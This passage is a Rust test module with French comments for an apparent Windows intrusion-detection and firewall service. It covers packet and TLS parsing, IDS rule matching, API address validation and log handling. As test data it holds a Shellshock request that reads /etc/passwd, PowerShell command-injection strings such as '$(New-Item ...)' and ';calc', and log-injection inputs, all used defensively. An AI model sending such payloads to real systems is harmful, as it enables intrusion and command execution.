//! Tests des fonctions pures qui lisent des données venues du réseau ou de fichiers externes.
//! Le service est compilé avec panic = "abort" : un index hors limites tuerait le service SYSTEM. D'où, en
//! plus des cas valides, un « mini-fuzz » : toutes les troncatures d'un message valide et des milliers
//! d'entrées pseudo-aléatoires, qui ne doivent jamais provoquer de panique.
//!   cargo test --release

use std::net::Ipv4Addr;

/// Générateur pseudo-aléatoire déterministe (xorshift), pour des tests reproductibles
struct Hasard(u64);

impl Hasard {
    fn suivant(&mut self) -> u64 {
        self.0 ^= self.0 << 13;
        self.0 ^= self.0 >> 7;
        self.0 ^= self.0 << 17;
        self.0
    }

    fn octets(&mut self, max: usize) -> Vec<u8> {
        let n = (self.suivant() % max as u64) as usize;
        (0..n).map(|_| self.suivant() as u8).collect()
    }
}

/// Toutes les troncatures, puis des variantes corrompues octet par octet
fn torturer(valide: &[u8], f: &mut dyn FnMut(&[u8])) {
    for n in 0..=valide.len() {
        f(&valide[..n]);
    }
    let mut h = Hasard(0x9E37_79B9_7F4A_7C15);
    for _ in 0..3000 {
        let mut v = valide.to_vec();
        for _ in 0..4 {
            if !v.is_empty() {
                let i = (h.suivant() % v.len() as u64) as usize;
                v[i] = h.suivant() as u8;
            }
        }
        f(&v);
        f(&h.octets(600));
    }
}

// ------------------------------------------------------------ paquets IP

fn paquet_udp(charge: &[u8]) -> Vec<u8> {
    let total = 20 + 8 + charge.len();
    let mut p = vec![0x45, 0, (total >> 8) as u8, total as u8, 0, 0, 0x40, 0, 64, 17, 0, 0, 10, 0, 0, 2, 198, 51, 100, 1];
    p.extend_from_slice(&[0xC3, 0x50, 0, 9, 0, (8 + charge.len()) as u8, 0, 0]);
    p.extend_from_slice(charge);
    p
}

#[test]
fn decoder_paquet_udp() {
    let d = paquet_udp(b"bonjour");
    let p = crate::capture::decoder_test(&d, Ipv4Addr::new(10, 0, 0, 2)).expect("paquet valide");
    assert!(!p.entrant);
    assert_eq!(p.proto, 17);
    assert_eq!(p.port_destination, 9);
    assert_eq!(p.destination, Ipv4Addr::new(198, 51, 100, 1));
    assert_eq!(p.charge, b"bonjour");
}

#[test]
fn decoder_sans_panique() {
    let valide = paquet_udp(b"0123456789abcdef");
    torturer(&valide, &mut |d| {
        let _ = crate::capture::decoder_test(d, Ipv4Addr::new(10, 0, 0, 2));
    });
}

// ------------------------------------------------------------ TLS ClientHello

/// ClientHello minimal : TLS 1.2, deux suites (dont une GREASE), SNI, groupes, formats de points
fn client_hello(nom: &str) -> Vec<u8> {
    let mut ext = Vec::new();
    // SNI (0)
    let mut sni = vec![0, 0];
    let liste_len = 3 + nom.len();
    sni.extend_from_slice(&((liste_len + 2) as u16).to_be_bytes());
    sni.extend_from_slice(&(liste_len as u16).to_be_bytes());
    sni.push(0);
    sni.extend_from_slice(&(nom.len() as u16).to_be_bytes());
    sni.extend_from_slice(nom.as_bytes());
    ext.extend(sni);
    // GREASE (0x0a0a), ignoré par JA3
    ext.extend_from_slice(&[0x0a, 0x0a, 0, 0]);
    // supported_groups (10) : 29, 23
    ext.extend_from_slice(&[0, 10, 0, 6, 0, 4, 0, 29, 0, 23]);
    // ec_point_formats (11) : 0
    ext.extend_from_slice(&[0, 11, 0, 2, 1, 0]);
    let mut corps = vec![0x03, 0x03];
    corps.extend_from_slice(&[0u8; 32]);
    corps.push(0);
    corps.extend_from_slice(&[0, 4, 0x13, 0x01, 0x2a, 0x2a]);
    corps.extend_from_slice(&[1, 0]);
    corps.extend_from_slice(&(ext.len() as u16).to_be_bytes());
    corps.extend(ext);
    let mut hs = vec![1, 0, (corps.len() >> 8) as u8, corps.len() as u8];
    hs.extend(corps);
    let mut rec = vec![0x16, 0x03, 0x01, (hs.len() >> 8) as u8, hs.len() as u8];
    rec.extend(hs);
    rec
}

#[test]
fn client_hello_sni_et_ja3() {
    use md5::{Digest, Md5};
    let (sni, ja3) = crate::dpi::client_hello_test(&client_hello("www.example.com")).expect("ClientHello valide");
    assert_eq!(sni.as_deref(), Some("www.example.com"));
    // GREASE exclu des suites et des extensions
    let attendu: String = Md5::digest(b"771,4865,0-10-11,29-23,0").iter().map(|o| format!("{o:02x}")).collect();
    assert_eq!(ja3, attendu);
}

#[test]
fn client_hello_sans_panique() {
    torturer(&client_hello("exemple.lu"), &mut |d| {
        let _ = crate::dpi::client_hello_test(d);
    });
}

// ------------------------------------------------------------ DNS, LLMNR, NBNS

fn question_dns(nom: &str) -> Vec<u8> {
    let mut q = vec![0x12, 0x34, 0x01, 0, 0, 1, 0, 0, 0, 0, 0, 0];
    for partie in nom.split('.') {
        q.push(partie.len() as u8);
        q.extend_from_slice(partie.as_bytes());
    }
    q.extend_from_slice(&[0, 0, 1, 0, 1]);
    q
}

#[test]
fn noms_dns() {
    assert_eq!(crate::dpi::nom_question_test(&question_dns("Mairie.Example.LU")).as_deref(), Some("mairie.example.lu"));
    torturer(&question_dns("a.b.c.example.lu"), &mut |d| {
        let _ = crate::dpi::nom_question_test(d);
        let _ = crate::ndr::nom_dns_test(d);
        let _ = crate::ndr::nom_nbns_test(d);
    });
}

// ------------------------------------------------------------ règles IDS

#[test]
fn regles_integrees_lisibles() {
    let (regles, ignorees) = crate::ids::lire_texte_test(crate::ids::REGLES_INTEGREES);
    assert_eq!(ignorees, 0, "toutes les règles intégrées doivent être prises en charge");
    assert!(regles >= 15);
}

#[test]
fn regle_contenu_hexa_et_correspondance() {
    let r = r#"alert udp any any -> any any (msg:"test"; content:"ab|43 44|"; nocase; content:!"zz"; sid:1;)"#;
    assert!(crate::ids::correspond_test(r, b"xx AbCD yy").expect("règle lisible"));
    assert!(!crate::ids::correspond_test(r, b"xx AbCD zz").expect("règle lisible"), "contenu nié présent");
    let r = r#"alert tcp any any -> any any (msg:"d"; content:"GET"; depth:3; content:"admin"; distance:0; within:20; sid:2;)"#;
    assert!(crate::ids::correspond_test(r, b"GET /admin HTTP/1.1").unwrap());
    assert!(!crate::ids::correspond_test(r, b"POST /admin").unwrap(), "depth : GET doit être au début");
}

#[test]
fn regles_non_prises_en_charge_ignorees() {
    let (n, ignorees) = crate::ids::lire_texte_test("alert tcp any any -> any any (msg:\"x\"; pcre:\"/a+/\"; sid:3;)\nalert foo\n# commentaire\n");
    assert_eq!((n, ignorees), (0, 2));
}

/// Second audit, B-4-02 : une variable inconnue dans l'en-tête ne vaut plus « toutes les adresses » ni « tous les
/// ports » ; la règle est ignorée et comptée, comme une option non prise en charge. Les variables connues gardent leur
/// sens ($HOME_NET, $EXTERNAL_NET, $HTTP_PORTS…)
#[test]
fn ids_variable_inconnue_ignoree() {
    use crate::ids::lire_texte_test;
    // Négatifs : variables inconnues, seules, niées ou dans une liste, côté adresses et côté ports
    for regle in [
        r#"alert tcp $FOO_NET any -> any any (msg:"x"; content:"abc"; sid:1;)"#,
        r#"alert tcp any any -> !$FOO_NET any (msg:"x"; content:"abc"; sid:1;)"#,
        r#"alert tcp [$HOME_NET,$FOO_NET] any -> any any (msg:"x"; content:"abc"; sid:1;)"#,
        r#"alert tcp any any -> any $FOO_PORTS (msg:"x"; content:"abc"; sid:1;)"#,
        r#"alert tcp any [80,$FOO_PORTS] -> any any (msg:"x"; content:"abc"; sid:1;)"#,
        r#"alert tcp any any -> any !$FOO_PORTS (msg:"x"; content:"abc"; sid:1;)"#,
    ] {
        assert_eq!(lire_texte_test(regle), (0, 1), "variable inconnue : règle ignorée et comptée : {regle}");
    }
    // Positifs : variables connues, inchangées
    for regle in [
        r#"alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"x"; content:"abc"; sid:1;)"#,
        r#"alert tcp !$HOME_NET any -> [$HOME_NET,192.0.2.0/24] any (msg:"x"; content:"abc"; sid:1;)"#,
        r#"alert tcp any any -> any $HTTP_PORTS (msg:"x"; content:"abc"; sid:1;)"#,
        r#"alert tcp any [$SSH_PORTS,$ORACLE_PORTS] -> any !$FILE_DATA_PORTS (msg:"x"; content:"abc"; sid:1;)"#,
    ] {
        assert_eq!(lire_texte_test(regle), (1, 0), "variable connue : règle prise en charge : {regle}");
    }
}

/// Second audit, B-4-02 (décision du coordinateur) : les variables standard du suricata.yaml par défaut (version 7)
/// prennent leur valeur par défaut au lieu de rendre la règle ignorée ; une variable inventée reste ignorée
#[test]
fn ids_variables_standard_de_suricata() {
    use crate::capture::Paquet;
    use crate::ids::{correspond_paquet_test, lire_texte_test};
    let paquet = |source: [u8; 4], destination: [u8; 4], port_destination: u16| Paquet {
        entrant: true, proto: 6, source: source.into(), destination: destination.into(), port_source: 50000,
        port_destination, longueur: 43, drapeaux: 0x18, charge: b"abc",
    };
    // $HTTP_SERVERS vaut $HOME_NET : chargée, s'applique au réseau local seulement
    let r = r#"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS any (msg:"x"; content:"abc"; sid:1;)"#;
    assert_eq!(lire_texte_test(r), (1, 0));
    assert_eq!(correspond_paquet_test(r, &paquet([203, 0, 113, 5], [192, 168, 0, 10], 80)), Some(true), "serveur du réseau local");
    assert_eq!(correspond_paquet_test(r, &paquet([203, 0, 113, 5], [198, 51, 100, 7], 80)), Some(false), "adresse publique : pas un $HOME_NET");
    // $AIM_SERVERS vaut $EXTERNAL_NET
    let r = r#"alert tcp $HOME_NET any -> $AIM_SERVERS any (msg:"x"; content:"abc"; sid:2;)"#;
    assert_eq!(correspond_paquet_test(r, &paquet([192, 168, 0, 10], [198, 51, 100, 7], 5190)), Some(true));
    assert_eq!(correspond_paquet_test(r, &paquet([192, 168, 0, 10], [10, 0, 0, 7], 5190)), Some(false));
    // Ports : $MODBUS_PORTS 502, $SHELLCODE_PORTS tous sauf 80 (et nié : 80 seulement)
    let r = r#"alert tcp any any -> any $MODBUS_PORTS (msg:"x"; content:"abc"; sid:3;)"#;
    assert_eq!(correspond_paquet_test(r, &paquet([10, 0, 0, 1], [10, 0, 0, 2], 502)), Some(true));
    assert_eq!(correspond_paquet_test(r, &paquet([10, 0, 0, 1], [10, 0, 0, 2], 503)), Some(false));
    let r = r#"alert tcp any any -> any $SHELLCODE_PORTS (msg:"x"; content:"abc"; sid:4;)"#;
    assert_eq!(correspond_paquet_test(r, &paquet([10, 0, 0, 1], [10, 0, 0, 2], 4444)), Some(true));
    assert_eq!(correspond_paquet_test(r, &paquet([10, 0, 0, 1], [10, 0, 0, 2], 80)), Some(false));
    let r = r#"alert tcp any any -> any !$SHELLCODE_PORTS (msg:"x"; content:"abc"; sid:5;)"#;
    assert_eq!(correspond_paquet_test(r, &paquet([10, 0, 0, 1], [10, 0, 0, 2], 80)), Some(true));
    // Toutes les variables standard chargées
    for v in ["$SMTP_SERVERS", "$SQL_SERVERS", "$DNS_SERVERS", "$TELNET_SERVERS", "$DC_SERVERS", "$DNP3_SERVER", "$DNP3_CLIENT",
              "$MODBUS_SERVER", "$MODBUS_CLIENT", "$ENIP_SERVER", "$ENIP_CLIENT"] {
        assert_eq!(lire_texte_test(&format!(r#"alert tcp any any -> {v} any (msg:"x"; content:"abc"; sid:6;)"#)), (1, 0), "{v}");
    }
    for v in ["$DNP3_PORTS", "$FTP_PORTS", "[$FTP_PORTS,$MODBUS_PORTS]", "$GENEVE_PORTS", "$VXLAN_PORTS", "$TEREDO_PORTS"] {
        assert_eq!(lire_texte_test(&format!(r#"alert tcp any any -> any {v} (msg:"x"; content:"abc"; sid:7;)"#)), (1, 0), "{v}");
    }
    // Valeurs de GENEVE (6081), VXLAN (4789) et Teredo (3544)
    for (v, port) in [("$GENEVE_PORTS", 6081u16), ("$VXLAN_PORTS", 4789), ("$TEREDO_PORTS", 3544)] {
        let r = format!(r#"alert tcp any any -> any {v} (msg:"x"; content:"abc"; sid:11;)"#);
        assert_eq!(correspond_paquet_test(&r, &paquet([10, 0, 0, 1], [10, 0, 0, 2], port)), Some(true), "{v}");
        assert_eq!(correspond_paquet_test(&r, &paquet([10, 0, 0, 1], [10, 0, 0, 2], port + 1)), Some(false), "{v}");
    }
    // Négatifs : variable inventée ; $SHELLCODE_PORTS dans une liste (négation partielle, non représentable) ; $GTP_PORTS,
    // absent du suricata.yaml de la version 7
    for regle in [
        r#"alert tcp any any -> $INVENTE_SERVERS any (msg:"x"; content:"abc"; sid:8;)"#,
        r#"alert tcp any any -> any [21,$SHELLCODE_PORTS] (msg:"x"; content:"abc"; sid:9;)"#,
        r#"alert udp any any -> any $GTP_PORTS (msg:"x"; content:"abc"; sid:10;)"#,
    ] {
        assert_eq!(lire_texte_test(regle), (0, 1), "{regle}");
    }
}

/// Second audit, B-4-01 : une règle dont tous les `content` sont niés n'a pas de motif pour la recherche en une passe ;
/// elle passait par le seul en-tête, sans que ses contenus niés soient évalués. Chemin réel du moteur (`touchees`) : la
/// règle ne se déclenche que si aucun contenu nié n'est présent
#[test]
fn ids_regle_sans_contenu_positif_evalue_ses_negations() {
    use crate::capture::Paquet;
    use crate::ids::sids_declenches_test;
    let paquet = |charge: &'static [u8]| Paquet {
        entrant: true, proto: 6, source: [203, 0, 113, 5].into(), destination: [192, 168, 0, 10].into(), port_source: 50000,
        port_destination: 80, longueur: 40 + charge.len(), drapeaux: 0x18, charge,
    };
    let regle = r#"alert tcp any any -> any any (content:!"abc"; sid:1;)"#;
    assert_eq!(sids_declenches_test(regle, &paquet(b"xx abc yy")), Vec::<u64>::new(), "contenu nié présent : pas de déclenchement");
    assert_eq!(sids_declenches_test(regle, &paquet(b"xx abd yy")), vec![1], "contenu nié absent : déclenchement");
    // Options du contenu nié évaluées aussi (depth) ; deux négations : aucune des deux ne doit être présente
    let regle = r#"alert tcp any any -> any any (content:!"GET"; depth:3; sid:2;)"#;
    assert_eq!(sids_declenches_test(regle, &paquet(b"GET /")), Vec::<u64>::new());
    assert_eq!(sids_declenches_test(regle, &paquet(b"POST /GET")), vec![2], "GET hors des 3 premiers octets");
    let regle = r#"alert tcp any any -> any any (content:!"abc"; content:!"def"; sid:3;)"#;
    assert_eq!(sids_declenches_test(regle, &paquet(b"..def..")), Vec::<u64>::new());
    assert_eq!(sids_declenches_test(regle, &paquet(b"..xyz..")), vec![3]);
    // Règle sans aucun contenu (flags:S seul) : inchangée, l'en-tête suffit
    let syn = Paquet { drapeaux: 0x02, charge: b"", longueur: 40, ..paquet(b"") };
    assert_eq!(sids_declenches_test(r#"alert tcp any any -> any 80 (flags:S; sid:4;)"#, &syn), vec![4]);
    // Relecture de #273 : comme Suricata, une règle à contenu (nié ou non) ne correspond jamais à un paquet sans charge
    // utile (SYN, ACK) ; avec l'IPS, une règle drop bloquerait sinon un simple ACK
    let ack = Paquet { drapeaux: 0x10, charge: b"", longueur: 40, ..paquet(b"") };
    for regle in [r#"alert tcp any any -> any any (content:!"abc"; sid:1;)"#, r#"drop tcp any any -> any any (content:!"abc"; content:!"def"; sid:3;)"#] {
        assert_eq!(sids_declenches_test(regle, &ack), Vec::<u64>::new(), "ACK sans charge : {regle}");
        assert_eq!(sids_declenches_test(regle, &syn), Vec::<u64>::new(), "SYN sans charge : {regle}");
    }
    assert_eq!(crate::ids::correspond_test(r#"alert tcp any any -> any any (content:!"abc"; sid:1;)"#, b""), Some(false), "charge vide");
}

#[test]
fn regles_sans_panique() {
    let base = br#"alert tcp $EXTERNAL_NET any -> $HOME_NET [80,8080:8090] (msg:"x"; content:"|41 42|"; offset:2; depth:5; dsize:>3; flags:S; sid:7;)"#;
    torturer(base, &mut |d| {
        let _ = crate::ids::lire_texte_test(&String::from_utf8_lossy(d));
    });
}

/// IDS, règle Shellshock (sid 9000011, rév. 2), correction de bruit hors phase 3 : constaté, une alerte CRITIQUE sur
/// un téléchargement chiffré de plusieurs gigaoctets (réponses d'un port 443) ; « () { » puis « }; » n'importe où
/// après finissent par apparaître au hasard dans des octets chiffrés. La règle vise une requête vers un serveur HTTP
/// en clair du poste, avec la forme de l'attaque (« } » dans les 10 octets qui suivent « () { »). Règle entière
/// appliquée : en-tête (adresses, ports) et contenu.
#[test]
fn ids_shellshock_sans_faux_positif_sur_des_octets_quelconques() {
    use crate::capture::Paquet;
    use crate::ids::correspond_paquet_test;
    let regle = crate::ids::REGLES_INTEGREES.lines().find(|l| l.contains("sid:9000011")).expect("règle Shellshock");
    let paquet = |source: [u8; 4], port_source: u16, port_destination: u16, charge: &'static [u8]| Paquet {
        entrant: true, proto: 6, source: source.into(), destination: [192, 168, 0, 10].into(), port_source,
        port_destination, longueur: 40 + charge.len(), drapeaux: 0x18, charge,
    };
    let attaque: &[u8] = b"GET /cgi-bin/x HTTP/1.1\r\nUser-Agent: () { :; }; /bin/cat /etc/passwd\r\n\r\n";
    // Positif : requête Shellshock vers le port 80 du poste, depuis Internet
    assert_eq!(correspond_paquet_test(regle, &paquet([203, 0, 113, 5], 50000, 80, attaque)), Some(true), "attaque vers le port 80");
    assert_eq!(correspond_paquet_test(regle, &paquet([203, 0, 113, 5], 50000, 8080, b"Referer: () { _; } >_[$($())] { echo x; }\r\n")),
        Some(true), "variante vers le port 8080");
    // Négatifs : octets chiffrés ou quelconques (« () { » puis « }; » loin après), réponse d'un port 443, port TLS
    let mut quelconque = vec![0x17u8, 0x03, 0x03, 0x40, 0x00];
    quelconque.extend_from_slice(b"() {");
    quelconque.extend(std::iter::repeat(0xA5u8).take(500));
    quelconque.extend_from_slice(b"};");
    let quelconque: &'static [u8] = Box::leak(quelconque.into_boxed_slice());
    assert_eq!(correspond_paquet_test(regle, &paquet([203, 0, 113, 5], 50000, 80, quelconque)), Some(false), "« }} » loin de « () {{ »");
    assert_eq!(correspond_paquet_test(regle, &paquet([203, 0, 113, 5], 443, 50001, attaque)), Some(false), "réponse d'un serveur (port 443)");
    assert_eq!(correspond_paquet_test(regle, &paquet([203, 0, 113, 5], 50000, 443, attaque)), Some(false), "port TLS du poste");
    assert_eq!(correspond_paquet_test(regle, &paquet([192, 168, 0, 20], 50000, 80, attaque)), Some(false), "source du réseau local");
}

// ------------------------------------------------------------ adresses

#[test]
fn reseaux_reserves() {
    let ip = |s: &str| u32::from(s.parse::<Ipv4Addr>().unwrap());
    assert!(crate::menaces::recouvre_reserve_test(ip("172.0.0.0"), ip("172.255.255.255")), "172.0.0.0/8 contient 172.16.0.0/12");
    assert!(crate::menaces::recouvre_reserve_test(ip("100.0.0.0"), ip("100.255.255.255")), "CGNAT");
    assert!(!crate::menaces::recouvre_reserve_test(ip("8.8.8.0"), ip("8.8.8.255")));
}

/// Préfixe IPv6 hors bornes dans une liste de menaces téléchargée : « /129 » faisait lire ip[16] dans dans_reseau6
/// (panique, service arrêté par panic = "abort", et de nouveau à chaque redémarrage tant que la liste est en cache).
/// Une entrée invalide est écartée ; les préfixes de /16 à /128 restent pris en compte.
#[test]
fn liste_de_menaces_prefixe_ipv6_hors_bornes() {
    use crate::menaces::ajouter_et_chercher_test as essai;
    let cible = "2001:4860:4860::8888";
    for l in [129, 130, 255, 999, 4294967295u32] {
        let (n, trouve) = essai(&[&format!("2001:4860::/{l}")], cible);
        assert_eq!((n, trouve), (0, None), "/{l} : entrée refusée, aucune panique");
        // Le cas qui plantait : adresse cherchée identique au préfixe (les 16 octets comparés, puis ip[16])
        assert_eq!(essai(&[&format!("{cible}/{l}")], cible), (0, None), "{cible}/{l}");
    }
    for l in [0, 8, 15] {
        assert_eq!(essai(&[&format!("2001::/{l}")], cible).0, 0, "/{l} : trop large, refusé");
    }
    assert_eq!(essai(&["2001:4860::/16"], cible), (1, Some("essai".into())));
    assert_eq!(essai(&["2001:4860:4860::/48"], cible), (1, Some("essai".into())));
    assert_eq!(essai(&["2001:4860:4860::8888/127"], cible), (1, Some("essai".into())));
    assert_eq!(essai(&["2001:4860:4860::8888/128"], cible), (1, Some("essai".into())));
    assert_eq!(essai(&["2001:4860:4860::8889/128"], cible), (1, None));
    // Une ligne invalide parmi d'autres n'empêche pas les suivantes
    assert_eq!(essai(&["2001:db8::/200", "2001:4860::/32"], cible), (1, Some("essai".into())));
}

#[test]
fn plages_du_mode_panique() {
    let epargnee: Ipv4Addr = "1.1.1.1".parse().unwrap();
    let plages = crate::reponse::plages_internet(&[epargnee]);
    let dans = |ip: Ipv4Addr| plages.iter().any(|p| {
        let (a, b) = p.split_once('-').unwrap();
        let (a, b): (Ipv4Addr, Ipv4Addr) = (a.parse().unwrap(), b.parse().unwrap());
        u32::from(ip) >= u32::from(a) && u32::from(ip) <= u32::from(b)
    });
    assert!(dans("8.8.8.8".parse().unwrap()));
    assert!(!dans(epargnee), "serveur épargné");
    for local in ["192.168.1.254", "10.0.0.1", "172.16.5.5", "100.64.0.1", "224.0.0.252"] {
        assert!(!dans(local.parse().unwrap()), "{local} ne doit pas être bloqué");
    }
}

/// Lot 5 : jeton de l'API en échec fermé (BCryptGenRandom en échec ou octets nuls : aucun jeton, donc pas d'API),
/// et /api/v1/sante, servie sans jeton, ne dit plus le nom de la machine
#[test]
fn lot5_api_jeton_echec_ferme_et_sante_anonyme() {
    use crate::api::{corps_sante, jeton_depuis_alea};
    assert_eq!(jeton_depuis_alea(false, &[7u8; 32]), None, "générateur en échec : pas de jeton");
    assert_eq!(jeton_depuis_alea(true, &[0u8; 32]), None, "octets nuls : pas de jeton");
    assert_eq!(jeton_depuis_alea(true, &[0u8; 8]), None, "trop court : pas de jeton");
    let j = jeton_depuis_alea(true, &[0xab; 32]).unwrap();
    assert_eq!(j, "ab".repeat(32));
    let s = corps_sante();
    assert!(s.contains(r#""Ok":true"#) && s.contains(crate::commun::VERSION), "{s}");
    assert!(!s.contains("Hote"), "nom de la machine renvoyé sans jeton : {s}");
    let hote = crate::export::hote_local();
    assert!(hote.is_empty() || !s.contains(&hote), "nom de la machine renvoyé sans jeton : {s}");
    // Revue : un jeton DÉJÀ présent n'est repris que s'il a la forme d'un jeton créé par le service
    use crate::api::jeton_valide;
    assert!(jeton_valide(&"ab".repeat(32)));
    assert!(jeton_valide(&"0123456789ABCDEF".repeat(4)), "majuscules hexadécimales acceptées");
    assert!(!jeton_valide(&"0".repeat(64)), "jeton nul refusé");
    assert!(!jeton_valide(&"a".repeat(32)), "32 caractères : trop court");
    assert!(!jeton_valide(&"a".repeat(65)), "trop long");
    assert!(!jeton_valide(&"g".repeat(64)), "non hexadécimal");
    assert!(!jeton_valide(""), "vide");
}

#[test]
fn api_adresses_autorisees() {
    let l = vec!["192.168.1.10".to_string(), "10.0.0.0/8".to_string()];
    assert!(crate::api::autorisee_test("192.168.1.10".parse().unwrap(), &l));
    assert!(crate::api::autorisee_test("10.20.30.40".parse().unwrap(), &l));
    assert!(!crate::api::autorisee_test("192.168.1.11".parse().unwrap(), &l));
    assert!(crate::api::autorisee_test("127.0.0.1".parse().unwrap(), &[]));
    assert_eq!(crate::api::decoder_test("a%20b+c%3A%"), "a b c:%");
}

/// Audit SEC-009 (AUD3-01) et SEC-007 (AUD3-04) : seule la partie avant « / » était vérifiée, la suite allait telle
/// quelle dans un script PowerShell exécuté en SYSTEM ; un réseau IPv6 ouvrait le pare-feu sans être jamais reconnu
#[test]
fn audit_api_adresses_autorisees_strictes() {
    use crate::api::{adresse_autorisee_valide as valide, adresses_invalides, liste_powershell};
    for a in ["10.0.0.1", "192.168.1.0/24", "10.0.0.0/8", "203.0.113.7/32"] {
        assert!(valide(a), "{a}");
    }
    for a in ["10.0.0.1/$(New-Item C:\\x)", "10.0.0.1/x|Out-Null", "10.0.0.1/8;calc", "10.0.0.1/24`n", "fd00::/64", "2001:db8::1",
              "10.0.0.1/7", "10.0.0.1/33", "10.0.0.1/0", "10.0.0.1/", "10.0.0.1/+24", "10.0.0.1/024", "exemple.test"] {
        assert!(!valide(a), "{a} : refusé");
    }
    assert_eq!(adresses_invalides("10.0.0.1, 10.0.0.1/x|Out-Null ; fd00::/64"), vec!["10.0.0.1/x|Out-Null", "fd00::/64"]);
    assert!(adresses_invalides("10.0.0.1;192.168.1.0/24").is_empty());
    // Script : chaînes entre apostrophes, jamais de texte libre ; liste vide : rien n'est ouvert
    assert_eq!(liste_powershell(&["10.0.0.1".into(), "192.168.1.0/24".into()]), "@('10.0.0.1','192.168.1.0/24')");
    assert_eq!(liste_powershell(&["10.0.0.1/$(x)".into()]), "'127.0.0.1'");
    assert_eq!(liste_powershell(&[]), "'127.0.0.1'");
}

#[test]
fn reglages_de_l_interface_avec_blocs_nuls() {
    // Ce qu'envoie l'interface tant que config.json n'existe pas (première installation) : blocs non créés,
    // sérialisés à null. Refusé, le passage en anglais échouait en « réglages illisibles »
    let json = r#"{"Langue":"en","Syslog":{"Actif":false,"Hote":"","Port":514,"Protocole":"UDP","Format":"JSON","NiveauMin":"Alerte"},"Api":{"Actif":false,"Port":8642,"Reseau":false,"Adresses":null},"Ips":false,"ListesRestreintes":false,"Notifications":null,"Maj":null,"BlocageAutoMenaces":true,"ReponseAutoRancongiciel":true}"#;
    let c: crate::commun::Config = serde_json::from_str(json).expect("réglages de l'interface lisibles");
    assert_eq!(c.langue, "en");
    assert_eq!(c.api.adresses, "");
    let defaut = crate::commun::Config::default();
    assert_eq!(c.maj.url, defaut.maj.url, "bloc nul : valeurs par défaut");
    assert_eq!(c.notifications.niveau_min, defaut.notifications.niveau_min);
}

// ------------------------------------------------------------ mise en forme

#[test]
fn horodatage_et_base64() {
    let t = std::time::UNIX_EPOCH + std::time::Duration::from_secs(1_792_998_000);
    assert_eq!(crate::export::horodatage_utc(t), "2026-10-26T07:00:00.000Z");
    assert_eq!(crate::notifications::base64_test(b"Ma"), "TWE=");
    assert_eq!(crate::notifications::base64_test("é".as_bytes()), "w6k=");
}

/// Audit AUD2-02 : powershell.exe n'est pas dans System32 même, un nom nu était cherché dans le PATH par SYSTEM.
/// Chemin absolu, et aucun module du service ne lance plus « powershell.exe » par son seul nom.
#[test]
fn audit_powershell_par_chemin_absolu() {
    let p = crate::natif::powershell_exe();
    assert!(std::path::Path::new(&p).is_absolute() && p.to_lowercase().ends_with(r"\system32\windowspowershell\v1.0\powershell.exe"), "{p}");
    assert!(std::path::Path::new(&p).is_file(), "{p} introuvable");
    let nus = [concat!("Command::new(", "\"powershell.exe\")"), concat!("Command::new(", "\"powershell\")")];
    for (nom, source) in [("api", include_str!("api.rs")), ("baseline", include_str!("baseline.rs")), ("blocage", include_str!("blocage.rs")),
                          ("capture", include_str!("capture.rs")), ("maj", include_str!("maj.rs")), ("parefeu", include_str!("parefeu.rs")),
                          ("protection", include_str!("protection.rs")), ("reponse", include_str!("reponse.rs")), ("moniteur", include_str!("moniteur.rs")),
                          ("hygiene", include_str!("hygiene.rs")), ("natif", include_str!("natif.rs")), ("gpo", include_str!("gpo.rs"))] {
        assert!(!nus.iter().any(|nu| source.contains(nu)), "{nom}.rs lance encore powershell.exe par son seul nom");
    }
    // msiexec du script de mise à jour (SYSTEM) : par son chemin absolu, jamais cherché dans le PATH
    assert!(!include_str!("maj.rs").contains(concat!("Start-Process ", "msiexec")), "msiexec cherché dans le PATH");
    // curl : -q en premier argument partout (aucun .curlrc lu ; -q n'agit qu'en premier)
    let appel = concat!("Command::new(", "\"curl.exe\")");
    for (nom, source) in [("menaces", include_str!("menaces.rs")), ("maj", include_str!("maj.rs")), ("notifications", include_str!("notifications.rs")),
                          ("dpi", include_str!("dpi.rs")), ("geoip", include_str!("geoip.rs")), ("hygiene", include_str!("hygiene.rs"))] {
        for (i, _) in source.match_indices(appel) {
            let suite: String = source[i + appel.len()..].chars().filter(|c| !c.is_whitespace()).take(20).collect();
            assert!(suite.starts_with(".args([\"-q\"") || suite.starts_with(".arg(\"-q\")"), "{nom}.rs : curl sans -q en premier ({suite})");
        }
    }
}

/// Audit AUD4-05 : un nom DNS, NBNS ou UPnP, une ligne de commande contenant une fin de ligne ajoutaient de fausses
/// lignes horodatées au journal du service
#[test]
fn audit_journal_une_seule_ligne_par_message() {
    let l = crate::commun::ligne_de_journal("nom a\r\n2026-10-25 10:00:00  faux\u{2028}suite\u{0}\tfin");
    assert!(!l.chars().any(|c| c.is_control() || c == '\u{2028}' || c == '\u{2029}'), "{l:?}");
    assert!(l.contains("2026-10-25 10:00:00  faux") && l.starts_with("nom a"));
    assert_eq!(crate::commun::ligne_de_journal("é ordinaire"), "é ordinaire");
}

/// Audit du 2026-11-23, A-8-3 : rotation du journal sur 5 générations (journal.1 à journal.5) ; la plus ancienne seule
/// est remplacée ; une ligne dit l'intervalle couvert par la génération qui vient de tourner
#[test]
fn journal_rotation_cinq_generations() {
    use crate::commun::{rotation_due, tourner_journal, GENERATIONS_JOURNAL, TAILLE_JOURNAL};
    assert_eq!(GENERATIONS_JOURNAL, 5);
    assert!(!rotation_due(TAILLE_JOURNAL) && rotation_due(TAILLE_JOURNAL + 1) && !rotation_due(0));
    let d = dossier_test("journal-rotation");
    let journal = d.join("journal.txt");
    for n in 1..=7 {
        std::fs::write(&journal, format!("2026-11-{n:02} 08:00:00  premier {n}\r\n2026-11-{n:02} 18:30:00  dernier {n}\r\n")).unwrap();
        let ligne = tourner_journal(&d).expect("rotation faite");
        assert!(ligne.contains(&format!("2026-11-{n:02} 08:00:00")) && ligne.contains(&format!("2026-11-{n:02} 18:30:00")) && ligne.contains("journal.1.txt"), "{ligne}");
        assert!(!journal.exists(), "journal.txt repart à vide");
    }
    // Sept rotations : générations 1 à 5 gardées, la plus récente en 1 ; rien au-delà de 5
    for (g, n) in (1..=5).zip((3..=7).rev()) {
        let contenu = std::fs::read_to_string(d.join(format!("journal.{g}.txt"))).unwrap();
        assert!(contenu.contains(&format!("premier {n}")), "journal.{g}.txt : {contenu}");
    }
    assert!(!d.join("journal.6.txt").exists());
    // Contenu sans heure lisible (ou vide, non UTF-8) : rotation quand même, intervalle « inconnu », jamais de panique
    std::fs::write(&journal, [0xFFu8, 0xFE, b'x']).unwrap();
    assert!(tourner_journal(&d).expect("rotation").contains("inconnu"));
